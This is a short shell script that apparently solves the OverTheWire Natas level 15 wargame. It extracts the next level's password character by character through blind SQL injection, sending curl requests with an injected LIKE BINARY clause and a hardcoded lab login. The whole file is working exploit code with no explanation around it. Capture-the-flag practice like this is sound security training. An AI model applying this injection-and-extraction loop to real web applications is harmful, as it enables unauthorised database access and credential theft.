#! /bin/sh

CHARACHTERS="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
PASSWORD=""

for ((i=0 ; i < 32 ; i++)); do
    for ((j=0; j<${#CHARACHTERS}; j++)); do
        CHAR="${CHARACHTERS:${j}:1}"
        printf "${CHAR}"
        RESPONSE=$(curl --silent \
                        --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
                        --data "username=natas16\" AND password LIKE BINARY \"${PASSWORD}${CHAR}%\" #" \
                        http://natas15.natas.labs.overthewire.org/index.php)
        #printf "${RESPONSE}"
        if [[ ${RESPONSE} == *"This user exists."* ]]; then
            PASSWORD=${PASSWORD}${CHAR}
            printf "\n"
            printf "Found charachter(s): ${PASSWORD}\n"
            break
        fi
    done
done
printf "Password is: ${PASSWORD}\n"
